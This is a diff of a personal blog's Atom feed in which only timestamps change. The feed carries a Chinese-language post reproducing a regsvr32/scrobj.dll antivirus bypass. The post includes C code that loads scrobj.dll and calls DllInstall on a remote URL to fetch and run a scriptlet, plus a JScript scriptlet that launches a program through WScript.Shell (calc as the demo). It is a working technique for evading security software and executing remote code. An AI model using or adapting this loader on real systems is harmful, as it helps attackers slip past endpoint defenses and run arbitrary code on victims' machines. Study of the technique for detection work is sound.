@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-01-19T17:54:55.814Z</updated>
+  <updated>2021-01-19T17:55:02.087Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://422926799.github.io/posts/b2680e3b.html"/>
     <id>http://422926799.github.io/posts/b2680e3b.html</id>
     <published>2021-01-19T17:46:02.000Z</published>
-    <updated>2021-01-19T17:54:55.814Z</updated>
+    <updated>2021-01-19T17:55:02.087Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波<br>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247486668&amp;idx=1&amp;sn=b490c44dd870307a574818fd2d56e4a3&amp;chksm=fb183ffecc6fb6e80f6ff64781325ebdfc8edc14462b2c6921213dcb72845dc243a2dc6f5176" target="_blank" rel="noopener">regsvr32绕过</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>regsvr32远程下载是调用scrobj.dll里的DllInstall函数实现的下载<br><img src="https://s3.ax1x.com/2021/01/20/sRKxoV.png" alt=""></p><p>IDA分析<br><img src="https://s3.ax1x.com/2021/01/20/sRMSiT.md.png" alt=""></p><p>API Monitor跟踪这个dll<br><img src="https://s3.ax1x.com/2021/01/20/sRM9WF.png" alt=""></p><p>搜索API关键名称CreateURLMonikerEx，找到函数位置<br><img src="https://s3.ax1x.com/2021/01/20/sRMiQJ.png" alt=""></p><p>搜索该函数调用点在sub_1800072D0，符合DllInstall函数调用<br><img src="https://s3.ax1x.com/2021/01/20/sRMZo6.png" alt=""></p><p>调用该函数实现regsvr32实现功能</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define error_print(name){printf(&quot;%s,Error Code:%d&quot;,GetLastError());exit(1);}int main(){        LPCSTR dllpath = &quot;c:\\windows\\system32\\scrobj.dll&quot;;        HMODULE load = LoadLibraryA(dllpath);        if (load == NULL) {               error_print(&quot;LoadLibraryA&quot;);        }        FARPROC getmodule = GetProcAddress(load, &quot;DllInstall&quot;);        if (getmodule == NULL) {               error_print(&quot;GetProcAddress&quot;);        }        ((void(*)(BOOL, TCHAR*))getmodule)(FALSE, L&quot;http://192.168.137.227/testx.txt&quot;); //指针函数调用    return 0;}</code></pre><p>testx.txt</p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;&lt;component id=&quot;TESTING&quot;&gt;&lt;registration  progid=&quot;TESTING&quot;  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;  &lt;script language=&quot;JScript&quot;&gt;    &lt;![CDATA[      var wsc = &quot;WScript.Shell&quot;;      var com = &quot;calc&quot;;      com.concat(&quot;.&quot;,&quot;e&quot;,&quot;x&quot;,&quot;e&quot;);      var foo = new ActiveXObject(wsc).Run(com);    ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/component&gt;</code></pre><p><img src="https://s3.ax1x.com/2021/01/20/sRMQQH.png" alt=""></p>]]></content>
     
